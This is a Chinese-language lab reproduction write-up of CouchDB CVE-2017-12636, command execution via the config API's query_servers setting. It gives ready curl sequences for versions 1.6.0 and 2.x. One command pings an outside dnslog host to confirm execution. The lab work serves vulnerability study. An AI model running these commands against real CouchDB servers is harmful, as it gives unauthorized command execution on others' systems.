**CouchDB** 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON)
API 访问。术语 “Couch” 是 “Cluster Of Unreliable Commodity Hardware” 的首字母缩写，它反映了
CouchDB 的目标具有高度可伸缩性，提供了高可用性和高可靠性，即使运行在容易出现故障的硬件上也是如此。

在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config
api修改couchdb的配置`query_server`，这个配置项在设计、执行view的时候将被运行。

漏洞影响版本：小于 1.7.0 以及 小于 2.1.1

由于该漏洞利用条件需要登录用户触发，通常配合CVE-2017-12635一起利用

CVE-2017-12635复现文章[链接](vuls/266890.html)

本文仅作漏洞复现记录与实现，利用流程如下:

1.漏洞环境

目标链接：http://192.168.101.152:5984/

![1616321477_60571bc51cfa1985ecdf4.png!small](https://image.3001.net/images/20210321/1616321477_60571bc51cfa1985ecdf4.png!small)

访问链接http://192.168.101.152:5984/_utils/如下

![1616321514_60571bea4b450cd9b5285.png!small](https://image.3001.net/images/20210321/1616321514_60571bea4b450cd9b5285.png!small)

由于Couchdb 2.x和和1.x的的API接口有所差别，导致利用方式也不同，这里演示版本为1.6.0版本

2.漏洞利用

1.6.0漏洞利用：

依次执行以下命令即可触发

其中vulhub:vulhub为管理员的账户密码

![1616321832_60571d28dc6f3234fc78f.png!small](https://image.3001.net/images/20210321/1616321832_60571d28dc6f3234fc78f.png!small)

curl -X PUT
'http://vulhub:vulhub@192.168.101.152:5984/_config/query_servers/cmd' -d
'"ping test.kfqhkz.dnslog.cn"'

curl -X PUT 'http://vulhub:vulhub@192.168.101.152:5984/vultest'

curl -X PUT 'http://vulhub:vulhub@192.168.101.152:5984/vultest/vul' -d
'{"_id":"770895a97726d5ca6d70a22173005c7b"}'

curl -X POST
'http://vulhub:vulhub@192.168.101.152:5984/vultest/_temp_view?limit=10' -d
'{"language":"cmd","map":""}' -H 'Content-Type:application/json'

执行完毕后查看dnslog

![1616322070_60571e1618cd41e411a08.png!small](https://image.3001.net/images/20210321/1616322070_60571e1618cd41e411a08.png!small)

命令执行成功

2.x漏洞利用如下：

Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问`/_membership`即可：

```  
curl http://vulhub:vulhub@your-ip:5984/_membership  
```

![1616322239_60571ebfc468d42f0d082.png!small](https://image.3001.net/images/20210321/1616322239_60571ebfc468d42f0d082.png!small)

可见，我们这里只有一个node，名字是`nonode@nohost`。

然后，我们修改`nonode@nohost`的配置：

```  
curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/success"'  
```

![1616322251_60571ecb353a0134b26bf.png!small](https://image.3001.net/images/20210321/1616322251_60571ecb353a0134b26bf.png!small)

然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：

```  
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'  
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d
'{"_id":"770895a97726d5ca6d70a22173005c7b"}'  
```

Couchdb 2.x删除了`_temp_view`，所以我们为了触发`query_servers`中定义的命令，需要添加一个`_view`：

```  
curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d
'{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H
"Content-Type: application/json"  
```

增加`_view`的同时即触发了`query_servers`中的命令。

